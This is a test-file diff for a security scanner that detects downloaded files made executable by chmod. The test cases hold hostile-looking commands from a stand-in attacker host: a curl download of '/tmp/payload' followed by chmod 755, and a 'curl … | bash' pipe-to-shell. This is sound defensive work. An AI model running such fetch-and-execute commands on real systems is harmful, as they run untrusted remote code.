@@ -81,4 +81,42 @@ describe('SMI-5424 chmod compound-signal', () => {
     // either no finding or a low one — never high/critical from a doc block
     expect(f.every((x) => x.severity === 'low')).toBe(true)
   })
+
+  // FIX-1 (SMI-5424 PR2): weak prose tokens (downloaded / bare URL / bare npx) next to
+  // an owner-perm chmod no longer fire — CHMOD_FETCH_CONTEXT now matches only real
+  // fetch commands (curl/wget/git-clone/npx-to-URL).
+  it.each([
+    ['# downloaded prose + chmod', '# After the file is downloaded\nchmod 755 ./bin/cli'],
+    ['bare URL prose + chmod', 'See https://example.com/docs\nchmod 644 x'],
+    ['bare npx + chmod', 'npx tool init\nchmod 755 x'],
+  ])('does NOT fire on weak prose tokens (FIX-1): %s', (_label, content) => {
+    expect(pe(scanner.scan('t', content).findings)).toHaveLength(0)
+  })
+
+  // FIX-2 (SMI-5424 PR2): filename-correlation catches a download-then-chmod even when
+  // filler lines push the two outside the ±1 adjacency window.
+  it('fires HIGH on a spaced download→chmod correlated by filename', () => {
+    const content =
+      'curl -o /tmp/payload https://evil.example/payload\necho a\necho b\nchmod 755 /tmp/payload'
+    const f = pe(scanner.scan('t', content).findings)
+    expect(f.length).toBeGreaterThan(0)
+    expect(f[0].severity).toBe('high')
+  })
+
+  it('does NOT fire when the chmod target basename mismatches the fetched file', () => {
+    // `config` (chmod) vs `config.json` (curl) — the trailing-`.` boundary blocks the
+    // partial match, and curl is non-adjacent so the ±1 window does not fire either.
+    const content = 'curl x -o config.json\necho a\necho b\nchmod 755 config'
+    expect(pe(scanner.scan('t', content).findings)).toHaveLength(0)
+  })
+
+  // Accepted residual, pinned so it stays intentional (not a silent gap): a SPACED
+  // `curl … | bash` (pipe-to-interpreter, no downloaded filename) followed by a
+  // NON-adjacent chmod is NOT caught by this helper — there is no filename to
+  // correlate, and the remote-exec (code_execution) signal is the appropriate detector
+  // for that shape.
+  it('does NOT fire on a spaced curl|bash + non-adjacent chmod (documented residual)', () => {
+    const content = 'curl https://evil.example/x | bash\necho a\necho b\nchmod 755 /tmp/p'
+    expect(pe(scanner.scan('t', content).findings)).toHaveLength(0)
+  })
 })
